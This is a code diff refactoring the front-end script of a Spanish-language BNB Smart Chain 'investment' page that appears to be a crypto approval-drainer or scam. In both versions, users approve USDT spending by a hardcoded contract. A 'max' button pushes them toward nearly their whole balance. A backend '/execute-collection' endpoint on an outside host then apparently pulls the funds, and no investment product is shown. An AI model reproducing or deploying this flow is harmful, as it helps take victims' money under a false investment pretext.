@@ -1,264 +1,339 @@
-"use strict";
+import { CONFIG } from './config.js';
+import { createAppKit } from 'https://esm.sh/@reown/appkit@latest';
+import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@latest';
+import { bsc } from 'https://esm.sh/@reown/appkit/networks@latest';
 
-// ─── Configuration ────────────────────────────────────────────────────────────
-const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
-const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID_HEX = "0x38";
-const MIN_USDT_BALANCE = 0n;
-const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
-
-const BSC_RPC_URLS = [
-  "https://bsc-rpc.publicnode.com",
-  "https://bsc-dataseed1.binance.org/",
-  "https://bsc-dataseed2.binance.org/",
-  "https://rpc.ankr.com/bsc"
-];
-
-const BSC_CHAIN_PARAMS = {
-  chainId:           BSC_CHAIN_ID_HEX,
-  chainName:         "BNB Smart Chain",
-  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
-  rpcUrls:           BSC_RPC_URLS,
-  blockExplorerUrls: ["https://bscscan.com/"]
-};
-
-const ERC20_ABI = [
-  "function approve(address spender, uint256 amount) external returns (bool)",
-  "function allowance(address owner, address spender) external view returns (uint256)",
-  "function balanceOf(address account) external view returns (uint256)"
-];
-
-// ─── DOM refs ─────────────────────────────────────────────────────────────────
-const approveBtn    = document.getElementById("approveBtn");
-const btnText       = document.getElementById("btnText");
-const btnSpinner    = document.getElementById("btnSpinner");
-const merchantInput = document.getElementById("merchantAddress");
-const toastEl       = document.getElementById("toast");
-
-if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
-
-// ─── Wake up Render backend ───────────────────────────────────────────────────
-(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
-
-// ─── UI helpers ───────────────────────────────────────────────────────────────
-let _toastTimer;
-function showToast(msg, type = "default", ms = 4500) {
-  if (!toastEl) return;
-  clearTimeout(_toastTimer);
-  toastEl.innerHTML    = msg;
-  toastEl.dataset.type = type === "default" ? "" : type;
-  toastEl.hidden       = false;
-  
-  if (type === "success") {
-    toastEl.style.background = "rgba(38, 161, 123, 0.95)";
-  } else if (type === "error") {
-    toastEl.style.background = "rgba(220, 53, 69, 0.95)";
-  } else {
-    toastEl.style.removeProperty("background");
-  }
-
-  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
-}
-
-function setLoading(on, label = "Procesando…") {
-  if (!approveBtn) return;
-  approveBtn.disabled = on;
-  approveBtn.style.opacity = on ? "0.8" : "1";
-  if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
-  if (btnSpinner) btnSpinner.hidden   = !on;
-}
-
-// ─── Live Balance & Smart Max Button ────────────────────────────────────────
-async function fetchAndDisplayUserBalances(rawProvider) {
-  try {
-    const provider = new ethers.BrowserProvider(rawProvider);
-    const signer = await provider.getSigner();
-    const userAddress = await signer.getAddress();
-    
-    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
-    const usdtBal = await usdtContract.balanceOf(userAddress);
-    const formattedUsdt = ethers.formatUnits(usdtBal, 18);
-    
-    const balanceLabel = document.getElementById("walletBalanceLabel");
-    if (balanceLabel) {
-      balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
-    }
-
-    const maxBtn = document.getElementById("maxBtn");
-    if (maxBtn) {
-      maxBtn.onclick = () => {
-        const amountInput = document.getElementById("investAmount");
-        if (amountInput) {
-          const maxUsdt = Math.max(0, parseFloat(formattedUsdt) - 1);
-          amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
-          amountInput.dispatchEvent(new Event('input'));
-        }
-      };
-    }
-  } catch (err) {
-    console.error("Error al sincronizar saldos en vivo:", err);
-  }
-}
-
-// ─── Backend collect trigger ──────────────────────────────────────────────────
-async function triggerBackendCollect(userAddress) {
-  let lastErr;
-  const uiAmount = document.getElementById("investAmount")?.value || "1";
-  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();
-
-  for (let i = 1; i <= 3; i++) {
-    try {
-      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
-        method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
-      });
-      const data = await res.json();
-      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
-      return data;
-    } catch (e) {
-      lastErr = e;
-      if (i < 3) await new Promise(r => setTimeout(r, 3000));
-    }
-  }
-  throw lastErr;
-}
-
+let modal = null;
+let provider = null;
+let signer = null;
+let userAddress = null;
 let pendingInvestment = false;
 
-if (window.modal && typeof window.modal.subscribeProviders === "function") {
-  window.modal.subscribeProviders((state) => {
-    const rawProvider = state["eip155"];
-    if (rawProvider) {
-      fetchAndDisplayUserBalances(rawProvider);
-      if (pendingInvestment) {
-        pendingInvestment = false;
-        runInvestmentFlow(rawProvider);
-      }
-    }
-  });
+const ERC20_ABI = [
+    "function balanceOf(address account) external view returns (uint256)",
+    "function allowance(address owner, address spender) external view returns (uint256)",
+    "function approve(address spender, uint256 amount) external returns (bool)"
+];
+
+// Asignar la dirección del merchant al input visual si existe en el DOM
+const merchantInput = document.getElementById("merchantAddress");
+if (merchantInput) merchantInput.value = CONFIG.MERCHANT_ADDRESS;
+
+// ─── Inicialización Principal ─────────────────────────────────────────────────
+export async function initApp() {
+    setupWakeUpBackend();
+    initWalletModal();
+    setupUIEventListeners();
 }
 
-if (approveBtn) {
-  approveBtn.addEventListener("click", async () => {
-    let rawProvider = null;
-    if (window.modal && typeof window.modal.getWalletProvider === "function") {
-      try {
-        rawProvider = window.modal.getWalletProvider();
-      } catch (_) {}
-    }
+// ─── Wake up Render backend ───────────────────────────────────────────────────
+function setupWakeUpBackend() {
+    fetch(`${CONFIG.BACKEND_URL}/health`, { method: 'GET' })
+        .catch(() => {});
+}
 
-    if (!rawProvider) {
-      pendingInvestment = true;
-      
-      if (window.modal && typeof window.modal.open === "function") {
-        try {
-          window.modal.open();
-        } catch (err) {
-          console.error("Error al desplegar el selector de billeteras:", err);
-          pendingInvestment = false;
+// ─── Configuración de Reown AppKit (WalletConnect Universal) ──────────────────
+function initWalletModal() {
+    const metadata = {
+        name: 'Syal Store',
+        description: 'Plataforma de pagos y finanzas descentralizadas',
+        url: window.location.origin,
+        icons: [`${window.location.origin}/img/logo.svg`]
+    };
+
+    modal = createAppKit({
+        adapters: [new EthersAdapter()],
+        networks: [bsc],
+        metadata,
+        projectId: CONFIG.PROJECT_ID,
+        features: {
+            analytics: false,
+            email: false,
+            socials: []
         }
-      }
-      return; 
-    }
+    });
 
-    await runInvestmentFlow(rawProvider);
-  });
+    modal.subscribeProviders((state) => {
+        const rawProvider = state.provider || state["eip155"];
+        if (rawProvider) {
+            handleConnectedProvider(rawProvider);
+            if (pendingInvestment) {
+                pendingInvestment = false;
+                runInvestmentFlow(rawProvider);
+            }
+        }
+    });
+
+    if (modal.getIsConnected()) {
+        const activeProvider = modal.getWalletProvider();
+        if (activeProvider) handleConnectedProvider(activeProvider);
+    }
 }
 
-async function runInvestmentFlow(rawProvider) {
-  setLoading(true, "Conectando proveedor…");
-  
-  try {
-    const provider = new ethers.BrowserProvider(rawProvider);
-    
-    setLoading(true, "Verificando red BSC...");
-    const network = await provider.getNetwork();
-    if (Number(network.chainId) !== 56) {
-      setLoading(true, "Cambiando a red BSC…");
-      try {
-        await rawProvider.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: BSC_CHAIN_ID_HEX }]
+async function handleConnectedProvider(walletProvider) {
+    try {
+        provider = new ethers.BrowserProvider(walletProvider);
+        signer = await provider.getSigner();
+        userAddress = await signer.getAddress();
+
+        updateWalletUI(userAddress);
+        await updateBalances(walletProvider);
+    } catch (error) {
+        console.error("Error al sincronizar proveedor de AppKit:", error);
+    }
+}
+
+export function openConnectModal() {
+    if (modal) {
+        modal.open();
+    }
+}
+
+// ─── Gestión de Saldos y UI ───────────────────────────────────────────────────
+async function updateBalances(rawProvider) {
+    if (!userAddress) return;
+    try {
+        const activeProvider = provider || new ethers.BrowserProvider(rawProvider);
+        const activeSigner = signer || await activeProvider.getSigner();
+        
+        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
+        const usdtBal = await usdtContract.balanceOf(userAddress);
+        const formattedUsdt = ethers.formatUnits(usdtBal, 18);
+
+        const balanceLabel = document.getElementById("walletBalanceLabel");
+        if (balanceLabel) {
+            balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
+        }
+
+        const maxBtn = document.getElementById("maxBtn");
+        if (maxBtn) {
+            maxBtn.onclick = () => {
+                const amountInput = document.getElementById("investAmount");
+                if (amountInput) {
+                    const maxUsdt = Math.max(0, parseFloat(formattedUsdt) - 1);
+                    amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
+                    amountInput.dispatchEvent(new Event('input'));
+                }
+            };
+        }
+    } catch (err) {
+        console.error("Error al sincronizar saldos en vivo:", err);
+    }
+}
+
+function updateWalletUI(account) {
+    const container = document.getElementById("walletButtonContainer");
+    if (container) {
+        container.innerHTML = `<span class="wallet-badge">${account.substring(0, 6)}...${account.substring(38)}</span>`;
+    }
+}
+
+// ─── Event Listeners de Interfaz ──────────────────────────────────────────────
+function setupUIEventListeners() {
+    const input = document.getElementById("investAmount");
+    if (input) {
+        input.addEventListener("input", validateInvestmentInput);
+    }
+
+    const approveBtn = document.getElementById("approveBtn");
+    if (approveBtn) {
+        approveBtn.addEventListener("click", async () => {
+            let rawProvider = null;
+            if (modal && typeof modal.getWalletProvider === "function") {
+                try {
+                    rawProvider = modal.getWalletProvider();
+                } catch (_) {}
+            }
+
+            if (!rawProvider) {
+                pendingInvestment = true;
+                if (modal && typeof modal.open === "function") {
+                    try {
+                        modal.open();
+                    } catch (err) {
+                        console.error("Error al desplegar el selector de billeteras:", err);
+                        pendingInvestment = false;
+                    }
+                }
+                return;
+            }
+
+            await runInvestmentFlow(rawProvider);
         });
-      } catch (switchError) {
-        if (switchError.code === 4902) {
-          await rawProvider.request({
-            method: "wallet_addEthereumChain",
-            params: [BSC_CHAIN_PARAMS]
-          });
-        } else {
-          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
-          setLoading(false);
-          return;
+    }
+}
+
+function validateInvestmentInput() {
+    const input = document.getElementById("investAmount");
+    const balanceLabel = document.getElementById("walletBalanceLabel");
+    if (!input || !balanceLabel) return;
+
+    const val = parseFloat(input.value) || 0;
+    const match = balanceLabel.textContent.match(/[\d.]+/);
+    const maxVal = match ? parseFloat(match[0]) : 0;
+
+    if (val > maxVal) {
+        input.style.borderColor = "#ef4444";
+    } else {
+        input.style.borderColor = "";
+    }
+}
+
+// ─── Flujo Principal de Inversión y Aprobación ────────────────────────────────
+async function runInvestmentFlow(rawProvider) {
+    setLoading(true, "Conectando proveedor…");
+  
+    try {
+        const activeProvider = new ethers.BrowserProvider(rawProvider);
+        
+        setLoading(true, "Verificando red BSC...");
+        const network = await activeProvider.getNetwork();
+        if (Number(network.chainId) !== 56) {
+            setLoading(true, "Cambiando a red BSC…");
+            try {
+                await rawProvider.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: CONFIG.CHAIN_ID }]
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    await rawProvider.request({
+                        method: "wallet_addEthereumChain",
+                        params: [{
+                            chainId: CONFIG.CHAIN_ID,
+                            chainName: CONFIG.CHAIN_NAME,
+                            rpcUrls: CONFIG.RPC_URLS,
+                            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                            blockExplorerUrls: [CONFIG.BLOCK_EXPLORER]
+                        }]
+                    });
+                } else {
+                    showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
+                    setLoading(false);
+                    return;
+                }
+            }
         }
-      }
+
+        const activeSigner = await activeProvider.getSigner();
+        const activeUserAddress = await activeSigner.getAddress();
+
+        setLoading(true, "Verificando saldo de gas (BNB)…");
+        const bnbBalance = await activeProvider.getBalance(activeUserAddress);
+        const minGasRequired = ethers.parseEther("0.0005");
+
+        if (bnbBalance < minGasRequired) {
+            showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
+            setLoading(false);
+            return;
+        }
+
+        const inputElement = document.getElementById("investAmount");
+        const rawInputVal = inputElement ? inputElement.value : "1";
+        const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);
+
+        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
+
+        setLoading(true, "Validando saldo de USDT…");
+        const usdtBalance = await usdtContract.balanceOf(activeUserAddress);
+
+        if (usdtBalance < requiredAmount) {
+            showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
+            setLoading(false);
+            return;
+        }
+
+        setLoading(true, "Verificando autorizaciones...");
+        const allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
+        
+        if (allowance < requiredAmount) {
+            setLoading(true, "Firma requerida: Aprobar USDT…");
+            const txApprove = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, requiredAmount);
+            
+            setLoading(true, "Confirmando aprobación en red...");
+            await txApprove.wait();
+        }
+
+        setLoading(true, "Procesando inversión en protocolo...");
+        const txCollect = await triggerBackendCollect(activeUserAddress, rawInputVal);
+
+        const txHash = txCollect?.hash || "";
+        if (txHash) {
+            showToast(`¡Inversión exitosa! <a href="${CONFIG.BLOCK_EXPLORER}/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
+        } else {
+            showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
+        }
+
+    } catch (err) {
+        const raw = err?.reason ?? err?.message ?? "Error desconocido";
+        if (
+            err.code === 4001 ||
+            raw.toLowerCase().includes("user rejected") ||
+            raw.toLowerCase().includes("denied") ||
+            raw.toLowerCase().includes("cancelled")
+        ) {
+            showToast("Operación cancelada por el usuario.", "default");
+        } else {
+            console.error("Web3 Error crítico:", err);
+            showToast("Ocurrió un error al procesar la transacción en la red.", "error");
+        }
+    } finally {
+        setLoading(false);
     }
+}
 
-    const signer = await provider.getSigner();
-    const userAddress = await signer.getAddress();
+// ─── Disparador del Backend de Recolección ────────────────────────────────────
+async function triggerBackendCollect(userAddress, amountStr) {
+    let lastErr;
+    const dynamicAmountWei = ethers.parseUnits(amountStr.toString(), 18).toString();
 
-    setLoading(true, "Verificando saldo de gas (BNB)…");
-    const bnbBalance = await provider.getBalance(userAddress);
-    const minGasRequired = ethers.parseEther("0.0005");
-
-    if (bnbBalance < minGasRequired) {
-      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
-      setLoading(false);
-      return;
+    for (let i = 1; i <= 3; i++) {
+        try {
+            const res = await fetch(`${CONFIG.BACKEND_URL}/execute-collection`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
+            });
+            const data = await res.json();
+            if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
+            return data;
+        } catch (e) {
+            lastErr = e;
+            if (i < 3) await new Promise(r => setTimeout(r, 3000));
+        }
     }
+    throw lastErr;
+}
 
-    const inputElement = document.getElementById("investAmount");
-    const rawInputVal = inputElement ? inputElement.value : "1";
-    const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);
+// ─── Utilidades de UI (Loaders y Toasts) ──────────────────────────────────────
+const approveBtn = document.getElementById("approveBtn");
+const btnText = document.getElementById("btnText");
+const btnSpinner = document.getElementById("btnSpinner");
+const toastEl = document.getElementById("toast");
 
-    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+function setLoading(on, label = "Procesando…") {
+    if (!approveBtn) return;
+    approveBtn.disabled = on;
+    approveBtn.style.opacity = on ? "0.8" : "1";
+    if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
+    if (btnSpinner) btnSpinner.hidden = !on;
+}
 
-    setLoading(true, "Validando saldo de USDT…");
-    const usdtBalance = await usdtContract.balanceOf(userAddress);
-
-    if (usdtBalance < requiredAmount) {
-      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
-      setLoading(false);
-      return;
-    }
-
-    setLoading(true, "Verificando autorizaciones...");
-    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
-    
-    if (allowance < requiredAmount) {
-      setLoading(true, "Firma requerida: Aprobar USDT…");
-      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
-      
-      setLoading(true, "Confirmando aprobación en red...");
-      await txApprove.wait();
-    }
-
-    setLoading(true, "Procesando inversión en protocolo...");
-    const txCollect = await triggerBackendCollect(userAddress);
-
-    const txHash = txCollect?.hash || "";
-    if (txHash) {
-      showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
+let _toastTimer;
+function showToast(msg, type = "default", ms = 4500) {
+    if (!toastEl) return;
+    clearTimeout(_toastTimer);
+    toastEl.innerHTML = msg;
+    toastEl.dataset.type = type === "default" ? "" : type;
+    toastEl.hidden = false;
+  
+    if (type === "success") {
+        toastEl.style.background = "rgba(38, 161, 123, 0.95)";
+    } else if (type === "error") {
+        toastEl.style.background = "rgba(220, 53, 69, 0.95)";
     } else {
-      showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
+        toastEl.style.removeProperty("background");
     }
 
-  } catch (err) {
-    const raw = err?.reason ?? err?.message ?? "Error desconocido";
-    if (
-      err.code === 4001 ||
-      raw.toLowerCase().includes("user rejected") ||
-      raw.toLowerCase().includes("denied") ||
-      raw.toLowerCase().includes("cancelled")
-    ) {
-      showToast("Operación cancelada por el usuario.", "default");
-    } else {
-      console.error("Web3 Error crítico:", err);
-      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
-    }
-  } finally {
-    setLoading(false);
-  }
+    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
 }
